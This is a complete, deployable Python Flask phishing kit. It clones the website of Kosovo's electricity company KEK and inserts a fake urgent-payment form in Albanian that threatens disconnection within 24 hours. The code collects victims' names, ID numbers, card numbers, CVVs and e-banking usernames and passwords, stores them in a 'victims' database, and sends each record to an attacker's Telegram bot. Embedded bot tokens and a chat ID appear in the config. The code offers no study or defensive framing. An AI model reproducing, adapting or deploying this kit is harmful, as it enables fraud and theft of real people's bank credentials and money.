#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KEK HARVESTER - RENDER.COM VERSION
PERMANENT FREE HOSTING - URL NEVER CHANGES - 24/7 ONLINE
NO NGROK NEEDED - NO PC NEEDED AFTER DEPLOY
Python 3.9+ required
"""

import os
import json
import time
import hashlib
import random
import sqlite3
import logging
from datetime import datetime
from flask import Flask, request, redirect

# ============================================================
# CONFIG - ONLY 2 TOKENS NEEDED (NO NGROK ON RENDER)
# ============================================================
TELEGRAM_BOT_TOKEN = "8704577684:AAGbeSQRV_EeUOUD1oqDAne0v-m3LQaQjMk"
TELEGRAM_CHAT_ID = "6840306598"

# ============================================================
# SETTINGS
# ============================================================
REAL_KEK_URL = "https://www.kek-energy.com"
DATA_FOLDER = "stolen_data"
DB_FILE = "victims.db"
os.makedirs(DATA_FOLDER, exist_ok=True)

# ============================================================
# LOGGING - RENDER CAPTURES STDOUT AUTOMATICALLY
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
log = logging.getLogger(__name__)

# ============================================================
# DATABASE
# ============================================================
def init_db():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT, timestamp TEXT, ip TEXT, user_agent TEXT,
            full_name TEXT, id_number TEXT, email TEXT, phone TEXT,
            address TEXT, city TEXT, postal_code TEXT, country TEXT,
            account_number TEXT, card_number TEXT, card_expiry TEXT,
            card_cvv TEXT, cardholder_name TEXT, card_type TEXT, card_bank TEXT,
            bank_name TEXT, bank_account TEXT, eb_user TEXT, eb_pass TEXT
        )''')
        conn.commit()
        conn.close()
        log.info("Database ready")
    except Exception as e:
        log.error(f"DB error: {e}")

init_db()

# ============================================================
# TELEGRAM (USING ONLY STANDARD LIBRARY + FLASK - NO EXTRA IMPORTS)
# ============================================================
import urllib.request
import urllib.parse

def telegram_send(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        parts = [msg[i:i+3900] for i in range(0, len(msg), 3900)]
        for p in parts:
            data = urllib.parse.urlencode({
                "chat_id": TELEGRAM_CHAT_ID,
                "text": p,
                "parse_mode": "HTML"
            }).encode('utf-8')
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            urllib.request.urlopen(req, timeout=15)
            time.sleep(0.3)
    except Exception as e:
        log.error(f"Telegram error: {e}")

def telegram_send_file(path, caption=""):
    try:
        if not os.path.exists(path):
            return
        import requests
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption[:1024]}, timeout=30)
    except Exception as e:
        log.error(f"Telegram file error: {e}")

# ============================================================
# CARD DETECTION
# ============================================================
def detect_card(card_number):
    cn = str(card_number).replace(' ', '').replace('-', '').strip()
    if not cn or len(cn) < 4:
        return "Unknown", "Unknown"
    fd = cn[0]
    if fd == '4': ct = "VISA"
    elif fd == '5': ct = "Mastercard"
    elif fd == '3': ct = "American Express"
    elif fd == '6': ct = "Discover"
    else: ct = "Unknown"
    
    bins = {
        '426588':'Raiffeisen Bank Kosovo','426589':'Raiffeisen Bank','424631':'BKT','545773':'TEB Kosovo',
        '545618':'TEB','489396':'Banka per Biznes','402640':'NLB Prishtina','401251':'Banka Ekonomike',
        '426690':'ProCredit Kosovo','422222':'BKT Kosova','423456':'Ziraat Bank','525678':'Isbank'
    }
    cb = bins.get(cn[:6], "Unknown Bank")
    return ct, cb

# ============================================================
# CLONE REAL KEK WEBSITE (ATTEMPTED ON STARTUP)
# ============================================================
CLONED_KEK_HTML = None

def clone_kek_site():
    global CLONED_KEK_HTML
    try:
        import requests as req
        from bs4 import BeautifulSoup
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        resp = req.get(REAL_KEK_URL, headers=headers, timeout=15)
        resp.encoding = 'utf-8'
        if resp.status_code != 200:
            log.warning(f"KEK returned {resp.status_code}")
            return False
        soup = BeautifulSoup(resp.text, 'html.parser')
        # Fix relative URLs
        for tag in soup.find_all(['a','link','script','img']):
            for attr in ['href','src']:
                val = tag.get(attr,'')
                if val and val.startswith('/') and not val.startswith('//'):
                    tag[attr] = REAL_KEK_URL + val
                elif val and val.startswith('//'):
                    tag[attr] = 'https:' + val
        # Find content area
        main = soup.find('main') or soup.find('div', class_=lambda c: c and 'content' in c.lower()) or soup.find('body')
        if main:
            main.clear()
            main.append(BeautifulSoup(PAYMENT_FORM_HTML, 'html.parser'))
        CLONED_KEK_HTML = str(soup)
        log.info("KEK site cloned successfully")
        return True
    except Exception as e:
        log.error(f"Clone failed: {e}")
        return False

# ============================================================
# PAYMENT FORM HTML (EMBEDDED INTO REAL KEK SITE)
# ============================================================
PAYMENT_FORM_HTML = '''
<div id="kek-payment-form" style="max-width:680px;margin:30px auto;padding:25px;background:white;border-radius:10px;box-shadow:0 5px 30px rgba(0,0,0,0.15);font-family:Arial,sans-serif;">
    <div style="background:#cc0000;color:white;padding:15px 20px;border-radius:8px;margin-bottom:20px;">
        <h3 style="margin:0;font-size:18px;">⚠️ NJOFTIM URGJENT: Fatura e Papaguar</h3>
        <p style="margin:5px 0 0 0;font-size:14px;">Shkëputja e energjisë elektrike është planifikuar brenda 24 orëve. Kryeni pagesën tani.</p>
    </div>
    <form method="POST" action="/pay" id="pf">
        <h4 style="color:#003366;border-bottom:2px solid #d4a017;padding-bottom:8px;margin:0 0 15px 0;">Të Dhënat Personale</h4>
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
            <input type="text" name="full_name" placeholder="Emri dhe Mbiemri *" required style="flex:1;min-width:200px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;">
            <input type="text" name="id_number" placeholder="Numri Personal (ID) *" required style="flex:1;min-width:200px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;">
        </div>
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
            <input type="email" name="email" placeholder="Email *" required style="flex:1;min-width:200px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;">
            <input type="tel" name="phone" placeholder="Telefoni *" required style="flex:1;min-width:200px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;">
        </div>
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
            <input type="text" name="address" placeholder="Adresa *" required style="flex:2;min-width:250px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;">
            <input type="text" name="city" placeholder="Qyteti *" value="Prishtinë" required style="flex:1;min-width:150px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;">
        </div>
        <h4 style="color:#003366;border-bottom:2px solid #d4a017;padding-bottom:8px;margin:20px 0 15px 0;">Të Dhënat e Kartës Bankare</h4>
        <input type="text" name="card_number" id="cn" placeholder="Numri i Kartës *" required style="width:100%;padding:14px;border:1px solid #ddd;border-radius:5px;margin-bottom:10px;font-size:16px;" maxlength="19">
        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
            <input type="text" name="card_expiry" placeholder="MM/YY *" required style="flex:1;min-width:100px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;" maxlength="5">
            <input type="password" name="card_cvv" placeholder="CVV *" required style="flex:1;min-width:80px;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;" maxlength="4">
        </div>
        <input type="text" name="cardholder_name" placeholder="Emri në Kartë *" required style="width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;margin-bottom:10px;font-size:14px;">
        <div style="background:#fffbf0;padding:12px;border-radius:5px;border:1px dashed #d4a017;margin-bottom:15px;font-size:13px;color:#666;">
            <strong>Verifikim shtesë (opsionale):</strong>
            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;">
                <input type="text" name="bank_name" placeholder="Emri i Bankës" style="flex:1;min-width:150px;padding:10px;border:1px solid #ddd;border-radius:3px;font-size:13px;">
                <input type="text" name="bank_account" placeholder="Numri i Llogarisë" style="flex:1;min-width:150px;padding:10px;border:1px solid #ddd;border-radius:3px;font-size:13px;">
            </div>
            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;">
                <input type="text" name="eb_user" placeholder="E-Banking Username" style="flex:1;min-width:150px;padding:10px;border:1px solid #ddd;border-radius:3px;font-size:13px;">
                <input type="password" name="eb_pass" placeholder="E-Banking Password" style="flex:1;min-width:150px;padding:10px;border:1px solid #ddd;border-radius:3px;font-size:13px;">
            </div>
        </div>
        <button type="submit" id="sb" style="width:100%;padding:16px;background:linear-gradient(135deg,#d4a017,#b8860b);color:white;font-size:18px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;">🔒 PAGUAJ TANI</button>
        <p style="text-align:center;font-size:11px;color:#999;margin:12px 0 0 0;">SSL 256-bit | PCI DSS Compliant | 3D Secure | Të dhënat tuaja janë të siguruara</p>
    </form>
</div>
<script>
document.getElementById('cn').addEventListener('input',function(e){var v=e.target.value.replace(/[^0-9]/g,'');var f='';for(var i=0;i<v.length;i++){if(i>0&&i%4===0)f+=' ';f+=v[i];}e.target.value=f.substring(0,19);});
document.getElementById('pf').addEventListener('submit',function(){var b=document.getElementById('sb');b.disabled=true;b.innerHTML='Duke u përpunuar...';});
</script>
'''

# ============================================================
# FALLBACK HTML (IF REAL KEK SITE UNREACHABLE)
# ============================================================
FALLBACK_HTML = '''<!DOCTYPE html>
<html lang="sq">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>KEK - Korporata Energjetike e Kosovës | Pagesa Online</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:Arial,sans-serif;background:#f0f2f5;}
.top{background:#003366;color:white;text-align:center;padding:15px;}
.top h1{font-size:22px;}.top p{font-size:13px;opacity:0.9;}
.container{max-width:680px;margin:20px auto;padding:0 15px;}
.alert{background:#cc0000;color:white;padding:15px 20px;border-radius:8px;margin-bottom:20px;font-weight:bold;}
.card{background:white;border-radius:10px;padding:25px;box-shadow:0 3px 15px rgba(0,0,0,0.1);}
.card h4{color:#003366;border-bottom:2px solid #d4a017;padding-bottom:8px;margin:0 0 15px 0;}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;margin-bottom:10px;font-size:14px;}
.row{display:flex;gap:10px;}.row input{flex:1;}
button{width:100%;padding:16px;background:#d4a017;color:white;font-size:18px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;}
.foot{text-align:center;padding:20px;color:#666;font-size:12px;}
</style>
</head>
<body>
<div class="top"><h1>Korporata Energjetike e Kosovës</h1><p>Portali Zyrtar i Pagesave Online</p></div>
<div class="container">
<div class="alert">⚠️ NJOFTIM URGJENT: Fatura juaj është e papaguar. Shkëputja planifikohet brenda 24 orëve.</div>
<div class="card">
<form method="POST" action="/pay" id="pf">
<h4>Të Dhënat Personale</h4>
<div class="row"><input type="text" name="full_name" placeholder="Emri dhe Mbiemri *" required><input type="text" name="id_number" placeholder="Numri Personal *" required></div>
<div class="row"><input type="email" name="email" placeholder="Email *" required><input type="tel" name="phone" placeholder="Telefoni *" required></div>
<div class="row"><input type="text" name="address" placeholder="Adresa *" required><input type="text" name="city" placeholder="Qyteti *" value="Prishtinë" required></div>
<h4>Të Dhënat e Kartës Bankare</h4>
<input type="text" name="card_number" id="cn" placeholder="Numri i Kartës *" required maxlength="19">
<div class="row"><input type="text" name="card_expiry" placeholder="MM/YY *" required maxlength="5"><input type="password" name="card_cvv" placeholder="CVV *" required maxlength="4"></div>
<input type="text" name="cardholder_name" placeholder="Emri në Kartë *" required>
<div style="background:#fffbf0;padding:10px;border-radius:5px;border:1px dashed #d4a017;margin:10px 0;font-size:13px;color:#666;">
<strong>Verifikim shtesë (opsionale):</strong>
<div class="row" style="margin-top:5px;"><input type="text" name="bank_name" placeholder="Emri i Bankës" style="padding:8px;"><input type="text" name="bank_account" placeholder="Numri i Llogarisë" style="padding:8px;"></div>
<div class="row" style="margin-top:5px;"><input type="text" name="eb_user" placeholder="E-Banking Username" style="padding:8px;"><input type="password" name="eb_pass" placeholder="E-Banking Password" style="padding:8px;"></div>
</div>
<button type="submit" id="sb">🔒 PAGUAJ TANI</button>
</form>
</div>
</div>
<div class="foot">© 2024 KEK - Korporata Energjetike e Kosovës. Të gjitha të drejtat e rezervuara.</div>
<script>
document.getElementById('cn').addEventListener('input',function(e){var v=e.target.value.replace(/[^0-9]/g,'');var f='';for(var i=0;i<v.length;i++){if(i>0&&i%4===0)f+=' ';f+=v[i];}e.target.value=f.substring(0,19);});
document.getElementById('pf').addEventListener('submit',function(){var b=document.getElementById('sb');b.disabled=true;b.innerHTML='Duke u përpunuar...';});
</script>
</body>
</html>'''

# ============================================================
# SUCCESS PAGE
# ============================================================
SUCCESS_HTML = '''<!DOCTYPE html>
<html lang="sq">
<head><meta charset="UTF-8"><title>Pagesa u Krye - KEK</title>
<style>body{font-family:Arial;background:#e8f5e9;text-align:center;padding-top:80px;}
.box{background:white;max-width:450px;margin:0 auto;padding:40px;border-radius:10px;box-shadow:0 5px 20px rgba(0,0,0,0.1);}
.check{width:70px;height:70px;background:#2e7d32;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;color:white;font-size:35px;margin-bottom:20px;}
h2{color:#2e7d32;}p{color:#666;}</style></head>
<body><div class="box"><div class="check">✓</div><h2>Pagesa u Krye me Sukses!</h2>
<p>Fatura juaj është paguar. Shkëputja është anuluar.</p>
<p style="font-size:13px;">Një konfirmim do të dërgohet në emailin tuaj.</p></div></body></html>'''

# ============================================================
# FLASK APP
# ============================================================
app = Flask(__name__)

@app.route('/')
def index():
    if CLONED_KEK_HTML:
        return CLONED_KEK_HTML
    return FALLBACK_HTML

@app.route('/pay', methods=['POST'])
def process_payment():
    try:
        data = {k: v.strip() for k, v in request.form.items()}
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        uid = hashlib.md5((ip + str(time.time())).encode()).hexdigest()[:10]
        card_number = data.get('card_number', '').replace(' ', '')
        card_type, card_bank = detect_card(card_number)
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Save to DB
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute('''INSERT INTO victims (
                uid,timestamp,ip,user_agent,full_name,id_number,email,phone,
                address,city,postal_code,country,account_number,card_number,
                card_expiry,card_cvv,cardholder_name,card_type,card_bank,
                bank_name,bank_account,eb_user,eb_pass
            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''', (
                uid,now,ip,request.headers.get('User-Agent',''),
                data.get('full_name'),data.get('id_number'),data.get('email'),data.get('phone'),
                data.get('address'),data.get('city'),data.get('postal_code',''),data.get('country','Kosovo'),
                data.get('account_number',''),card_number,data.get('card_expiry'),data.get('card_cvv'),
                data.get('cardholder_name'),card_type,card_bank,
                data.get('bank_name'),data.get('bank_account'),data.get('eb_user'),data.get('eb_pass')
            ))
            conn.commit()
            conn.close()
            log.info(f"VICTIM SAVED: {data.get('full_name')} | {card_type} | {card_bank}")
        except Exception as e:
            log.error(f"DB save error: {e}")
        
        # Save JSON
        json_path = f"{DATA_FOLDER}/victim_{uid}.json"
        try:
            all_data = {'uid':uid,'timestamp':now,'ip':ip,'user_agent':request.headers.get('User-Agent',''),
                        **data,'card_number_clean':card_number,'card_type':card_type,'card_bank':card_bank}
            with open(json_path,'w',encoding='utf-8') as f:
                json.dump(all_data,f,ensure_ascii=False,indent=2)
        except Exception as e:
            log.error(f"JSON save error: {e}")
        
        # Telegram
        msg = f"""🔥 <b>💳 NEW CARD - KEK PORTAL</b> 🔥
━━━━━━━━━━━━━━━━━━━━━━━━
🕒 <b>{now}</b> | 🌐 <b>{ip}</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>{data.get('full_name')}</b>
🆔 {data.get('id_number')}
📧 {data.get('email')} | 📞 {data.get('phone')}
📍 {data.get('address')}, {data.get('city')}
━━━━━━━━━━━━━━━━━━━━━━━━
💳 <code>{card_number}</code>
📅 <code>{data.get('card_expiry')}</code> | 🔒 <code>{data.get('card_cvv')}</code>
✍️ <code>{data.get('cardholder_name')}</code>
🏦 {card_bank} | 📋 {card_type}
━━━━━━━━━━━━━━━━━━━━━━━━
🏛 {data.get('bank_account')} | 🔑 {data.get('eb_user')}:<code>{data.get('eb_pass')}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ CARD READY FOR IMMEDIATE USE!"""
        telegram_send(msg)
        try:
            telegram_send_file(json_path, f"👤 {data.get('full_name')} | 💳 {card_number}")
        except:
            pass
        
        return SUCCESS_HTML
    except Exception as e:
        log.error(f"CRITICAL: {e}")
        return redirect('/')

# ============================================================
# HEALTH CHECK ENDPOINT (RENDER REQUIRES THIS)
# ============================================================
@app.route('/health')
def health():
    return "OK", 200

# ============================================================
# STARTUP
# ============================================================
if __name__ == "__main__":
    print("="*50)
    print("KEK HARVESTER - RENDER VERSION")
    print("="*50)
    
    # Check tokens
    if "PASTE_YOUR" in TELEGRAM_BOT_TOKEN:
        print("ERROR: Set TELEGRAM_BOT_TOKEN!")
        exit(1)
    if "PASTE_YOUR" in TELEGRAM_CHAT_ID:
        print("ERROR: Set TELEGRAM_CHAT_ID!")
        exit(1)
    
    # Try cloning KEK
    print("Cloning real KEK site...")
    clone_kek_site()
    
    # Test Telegram
    print("Testing Telegram...")
    telegram_send("✅ <b>KEK SERVER STARTED ON RENDER!</b>\n\nPermanent URL active.\nWaiting for victims...")
    
    # Run
    port = int(os.environ.get("PORT", 8080))
    print(f"Starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False)
